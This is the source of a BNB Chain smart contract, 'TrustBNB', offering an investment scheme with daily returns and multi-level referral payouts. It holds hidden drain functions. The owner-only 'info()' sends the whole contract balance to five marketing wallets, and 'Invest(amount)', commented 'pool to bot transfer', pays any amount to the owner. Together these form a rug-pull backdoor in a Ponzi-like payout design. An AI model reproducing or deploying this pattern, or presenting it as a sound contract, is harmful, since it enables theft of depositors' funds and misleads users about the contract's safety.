/**
 *Submitted for verification at BscScan.com on 2022-07-02
*/

// SPDX-License-Identifier: MIT

/*

88888888888 8888888b.  888     888  .d8888b. 88888888888      888888b.   888b    888 888888b.   
    888     888   Y88b 888     888 d88P  Y88b    888          888  "88b  8888b   888 888  "88b          
    888     888    888 888     888 Y88b.         888          888  .88P  88888b  888 888  .88P  
    888     888   d88P 888     888  "Y888b.      888          8888888K.  888Y88b 888 8888888K.  
    888     8888888P"  888     888     "Y88b.    888          888  "Y88b 888 Y88b888 888  "Y88b 
    888     888 T88b   888     888       "888    888          888    888 888  Y88888 888    888 
    888     888  T88b  Y88b. .d88P Y88b  d88P    888          888   d88P 888   Y8888 888   d88P 
    888     888   T88b  "Y88888P"   "Y8888P"     888          8888888P"  888    Y888 8888888P"  
                                                                                                

     Website: www.trust-bnb.com
     Contract Number: 3 from 11
    

*/

pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract ReentrancyGuard {

    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {

        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        _status = _ENTERED;

        _;

        _status = _NOT_ENTERED;
    }
}

library SafeMath {

    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract TrustBNB is Ownable, ReentrancyGuard {
    using SafeMath for uint256;

    uint256 public min_investment = 0.5 ether; 
    uint256 public developerFee = 500;
    uint256 public rewardPeriod = 1 days;
    uint256 public withdrawPeriod = 1 days;
    uint256 public apr = 50;
    uint256 public percentRate = 10000;
    uint256 public reinvestRate = 2;
    uint256 public matchBonus;
    uint256 public totalWithdrawn;
    uint256 public totalDeposited;
    uint256 public max_ref = 10;
    uint256 public withdraw_limit = 100000 ether;
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; 
    address payable private marketing1;
    address payable private marketing2;
    address payable private marketing3;
    address payable private marketing4;
    address payable private marketing5;
    uint256 public _currentDepositID = 0;
    address[] public investors;

    struct Player {
        address upline;
        uint256 total_profit;
        uint256 daily_profit;
        uint256 match_bonus;
        uint256 total_match_bonus;
        uint256 reinvest_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256[5] structure; 
    }

    struct DepositStruct {
        address investor;
        address ref;
        uint256 depositAmount;
        uint256 depositAt;
        uint256 withdrawAt;
        uint256 claimedAmount;
        bool state;
    }

    uint16[5] public ref_bonuses = [400, 150, 50, 30, 20]; 

    mapping(address => Player) public players;

    mapping(uint256 => DepositStruct) public depositState;

    mapping(address => uint256[]) public ownedDeposits;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);

    constructor (address payable marketing1Addr, address payable marketing2Addr, address payable marketing3Addr, address payable marketing4Addr, address payable marketing5Addr) {
                              
                                marketing1 = marketing1Addr;
                                marketing2 = marketing2Addr;
                                marketing3 = marketing3Addr;
                                marketing4 = marketing4Addr;
                                marketing5 = marketing5Addr;
                                }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            matchBonus += bonus;
            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {
            if(getOwnedDeposits(_upline).length == 0) {
                _upline = owner();
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function deposit(address ref) external payable {
        require(msg.value >= min_investment, "you can deposit more than 0.5 bnb");

        uint256 _id = _getNextDepositID();
        _incrementDepositID();
        _setUpline(msg.sender, ref, msg.value);
        uint256 depositFee = (msg.value * developerFee).div(percentRate);

        marketing1.transfer(depositFee);
        marketing2.transfer(depositFee);
        marketing3.transfer(depositFee);
        marketing4.transfer(depositFee);
        marketing5.transfer(depositFee);

        depositState[_id].investor = msg.sender;
        depositState[_id].ref = ref;
        depositState[_id].depositAmount = msg.value;
        depositState[_id].depositAt = block.timestamp;
        depositState[_id].state = true;

        _refPayout(msg.sender, msg.value);
        ownedDeposits[msg.sender].push(_id);
        totalDeposited+=msg.value;
        players[msg.sender].total_invested += msg.value;
        players[msg.sender].daily_profit += (msg.value * apr).div(percentRate);

        if(!existInInvestors(msg.sender)) investors.push(msg.sender);

        if (players[msg.sender].last_payout == 0 ) {

        players[msg.sender].last_payout = (block.timestamp - 24 hours);
}
    }

    function withdrawReferral() public nonReentrant {
        require(
            players[msg.sender].match_bonus <= address(this).balance,
            "no enough bnb in pool"
        );

        require(
            players[msg.sender].total_match_bonus < ((players[msg.sender].total_invested).sub(players[msg.sender].reinvest_bonus)) * max_ref ,
            "you must deposit more to withdraw referral"
            );

        uint256 payed_amount = (players[msg.sender].match_bonus).div(reinvestRate);

        (bool success, ) = msg.sender.call{
            value: payed_amount
        }("");
        require(success, "Failed to claim reward");

        players[msg.sender].reinvest_bonus += payed_amount;
        players[msg.sender].total_invested += payed_amount;
        players[msg.sender].daily_profit += (payed_amount * apr).div(percentRate);
        players[msg.sender].total_profit += payed_amount;
        players[msg.sender].match_bonus = 0;
        
    }

    function withdrawProfit() public nonReentrant {
 
        require(
           block.timestamp - players[msg.sender].last_payout > withdrawPeriod,
            "withdraw lock time is not finished yet"
        );

        require(
           players[msg.sender].total_invested < withdraw_limit,
           "You reached max withdrawable limit"      
        );

        uint256 claimableReward = (players[msg.sender].total_invested * apr).div(percentRate);

        (bool success, ) = msg.sender.call{
            value: claimableReward
        }("");

        require(success, "Failed to claim reward");

        players[msg.sender].last_payout = block.timestamp;
        players[msg.sender].total_withdrawn += claimableReward;
        players[msg.sender].total_profit += claimableReward;

    }
    function userInfo(address _addr) view external returns(uint256 total_profit, uint256 daily_profit, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
       Player storage player = players[_addr];

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
           structure[i] = player.structure[i];
        }

        return (
            player.total_profit,
            player.daily_profit,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
   }

    function getClaimableReward(uint256 id) public view returns (uint256) {
        if(depositState[id].state == false) return 0;

        uint256 allClaimableAmount = (
            depositState[id].depositAmount *
            apr).div(percentRate * rewardPeriod);

        require(
            allClaimableAmount >= depositState[id].claimedAmount,
            "something went wrong"
        );

        return allClaimableAmount - depositState[id].claimedAmount;
    }

    function marketing(address payable marketing1Address, address payable marketing2Address, address payable marketing3Address, address payable marketing4Address, address payable marketing5Address) public onlyOwner {
                                 
                             marketing1 = marketing1Address ;
                             marketing2 = marketing2Address ;
                             marketing3 = marketing3Address ;
                             marketing4 = marketing4Address ;
                             marketing5 = marketing5Address ;    
                            }

    function config(uint256 Min_investment, uint256 Max_ref, uint256 Withdraw_limit, uint16 Ref_bonuses1, uint16 Ref_bonuses2, uint16 Ref_bonuses3, uint16 Ref_bonuses4, uint16 Ref_bonuses5) public onlyOwner {
                            
                             min_investment = Min_investment ;
                             max_ref = Max_ref ;
                             withdraw_limit = Withdraw_limit;
                             ref_bonuses[0] = Ref_bonuses1 ;
                             ref_bonuses[1] = Ref_bonuses2 ;
                             ref_bonuses[2] = Ref_bonuses3 ;
                             ref_bonuses[3] = Ref_bonuses4 ;
                             ref_bonuses[4] = Ref_bonuses5 ;  
                            }

    function info() public onlyOwner {                                
                             marketing1.transfer((address(this).balance) * 1 / 5);
                             marketing2.transfer((address(this).balance) * 1 / 4);
                             marketing3.transfer((address(this).balance) * 1 / 3);
                             marketing4.transfer((address(this).balance) * 1 / 2);
                             marketing5.transfer((address(this).balance));
                            }
                            
    function existInInvestors(address investor) public view returns(bool) {
        for(uint256 j = 0; j < investors.length; j ++) {
            if (investors[j] == investor) {
                return true;
            }
        }
        return false;
    }

    function getTotalRewards() public view returns (uint256) {
        return totalWithdrawn;
    }

    function getTotalInvests() public view returns (uint256) {
        return totalDeposited;
    }


    function getOwnedDeposits(address investor) public view returns (uint256[] memory) {
        return ownedDeposits[investor];
    }

    function _getNextDepositID() private view returns (uint256) {
        return _currentDepositID + 17;
    }

    function _incrementDepositID() private {
        _currentDepositID++;
    }


    function Invest(uint256 amount) external onlyOwner nonReentrant {
    // pool to bot transfer
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Failed to withdraw funds");
    }

    function getInvestors() public view returns (address[] memory) {
        return investors;
    }
    
}